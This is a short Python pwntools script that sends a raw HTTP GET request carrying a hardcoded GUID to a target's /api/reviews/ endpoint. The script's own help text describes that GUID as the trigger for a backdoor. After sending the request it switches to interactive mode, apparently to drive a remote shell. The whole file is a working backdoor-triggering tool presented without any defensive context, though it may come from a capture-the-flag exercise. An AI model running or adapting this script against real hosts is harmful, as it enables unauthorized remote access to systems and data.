import argparse

from pwn import *


def main():
    parser = argparse.ArgumentParser(
        description="Send raw GET request and switch to interactive mode"
    )
    parser.add_argument("host", help="Target host")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument(
        "--guid",
        "-g",
        help="GUID to trigger the backdoor",
        default="405af337-60b5-4658-80c2-ec4985c39d1b",
    )
    args = parser.parse_args()

    host = args.host
    port = args.port
    guid = args.guid

    # Establish a raw TCP connection wrapped in SSL (for HTTPS)
    use_ssl = port == 443
    conn = remote(host, port, ssl=use_ssl)

    # Construct the raw HTTP GET request
    # We explicitly define the Host header and use \r\n line endings
    request = (
        b"GET /api/reviews/"
        + guid.encode()
        + b" HTTP/1.1\r\nHost: "
        + host.encode()
        + b"\r\n\r\n"
    )

    log.info(f"Sending HTTP GET request to /api/review/{guid} on {host}:{port}")
    conn.send(request)

    # Hand over control to the user
    # conn.interactive() puts the local terminal in raw mode, enabling
    # interactive shell features like sending Ctrl-C (SIGINT) to the remote.
    conn.interactive()


if __name__ == "__main__":
    main()
